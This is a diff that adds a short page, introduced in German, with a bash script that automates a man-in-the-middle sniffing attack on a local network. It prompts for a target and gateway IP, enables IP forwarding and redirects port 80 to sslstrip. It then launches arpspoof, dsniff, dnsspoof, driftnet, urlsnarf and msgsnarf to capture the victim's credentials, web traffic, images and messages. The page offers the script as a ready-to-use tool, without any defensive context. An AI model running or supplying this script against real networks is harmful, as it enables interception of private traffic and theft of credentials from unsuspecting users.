@@ -1,0 +1,24 @@
+kleines Bashskript zum starten von sniffing mit dsniff. 
+
+<code bash>
+#!/bin/bash
+#this Skript use dsniff,arpspoff, driftnet, ssldump
+
+terminal="gnome-terminal -e "
+read -p "What is your current interface: " int
+read -p "What is your target computer ip addresse: " yip
+read -p "What is your target gateway ip addresse: " gip
+
+#Allow IP Forwarding 
+echo 1 > /proc/sys/net/ipv4/ip_forward
+#Port 80 Redirect to Port 10000
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
+#Start sniffing with arpsniff
+$terminal "sslstrip -l 10000 -w sslstrip.log" & 
+$terminal "arpspoof -i $int -t $yip $gip" &
+$terminal "dsniff -i $int -w dsniff.log " & 
+$terminal "dnsspoof -i $int"
+driftnet -i $int &
+$terminal "urlsnarf -i $int" & 
+$terminal "msgsnarf -i $int" &
+</code>
